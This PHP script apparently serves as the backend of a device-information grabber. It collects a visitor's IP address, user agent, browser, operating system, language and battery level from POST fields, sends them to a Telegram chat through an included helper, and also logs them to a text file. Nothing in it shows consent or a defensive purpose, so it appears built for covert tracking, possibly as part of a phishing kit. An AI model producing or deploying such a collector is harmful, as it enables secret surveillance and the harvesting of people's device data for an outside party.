<?php
require_once __DIR__ . '/telegram.php';

$ip = $_POST['ip'] ?? 'Unknown';
$agent = $_POST['agent'] ?? 'Unknown';
$navigator = $_POST['navegador'] ?? 'Unknown';
$versionapp = $_POST['versionapp'] ?? 'Unknown';
$dystro = $_POST['dystro'] ?? 'Unknown';
$idioma = $_POST['idioma'] ?? 'Unknown';
$bateri = $_POST['bateri'] ?? 'Unknown';

$ts = gmdate('c');

$msg = "📱 <b>Info del dispositivo</b>\n".
       "🌐 IP: $ip\n".
       "🖥 Navegador: $navigator\n".
       "🧩 User-Agent: $agent\n".
       "💻 Versión App: $versionapp\n".
       "🖲 Sistema: $dystro\n".
       "🌐 Idioma: $idioma\n".
       "🔋 Batería: $bateri%\n".
       "⏰ Hora: $ts";

send_to_telegram($msg);

// Guardar también en archivo si quieres
$file = fopen('device_info.txt', 'a+');
fwrite($file, $msg."\n\n");
fclose($file);

echo json_encode(['status'=>'ok']);
?>
